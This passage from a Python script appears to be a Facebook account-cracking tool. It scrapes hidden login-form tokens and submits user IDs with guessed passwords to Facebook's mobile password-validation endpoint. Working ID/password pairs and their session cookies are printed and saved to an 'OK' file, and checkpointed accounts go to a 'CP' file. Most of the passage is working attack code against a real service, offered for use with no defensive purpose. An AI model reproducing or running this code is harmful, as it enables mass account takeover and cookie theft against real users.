2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text, "html.parser")
			form = urls.find('form', {'method':'post'})
			data = {
				'lsd': re.search('name="lsd" type="hidden" value="(.*?)"',str(form)).group(1),
				'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
				'uid': idf,
				'next': 'https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=2036793259884297&cbt=1685898230661&e2e=%7B%22init%22%3A1685898230661%7D&ies=1&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=ab5787e4-1930-4a43-b083-079caa897f72&scope=openid%2Cpublic_profile%2Cuser_friends%2Cemail&state=%7B%220_auth_logger_id%22%3A%22d43e9f47-9ed1-45ab-b92a-3597ae93a176%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%227pefkbumdvkfet5cqt6k%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.dts.freefireth&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=d43e9f47-9ed1-45ab-b92a-3597ae93a176&tp=unspecified',
				'flow': 'login_no_pin',
				'pass': pw,
			}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r[CP] 💔{k} {idf}|{pw}                \n<=> {ua}{P}\n')    
#				os.popen('play-audio /sdcard/cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r[OK] ❤{h} {idf}|{pw}             \n{kukis}  {P}    \n')
#				os.popen('play-audio /sdcard/ok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('RAF-MKZ')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
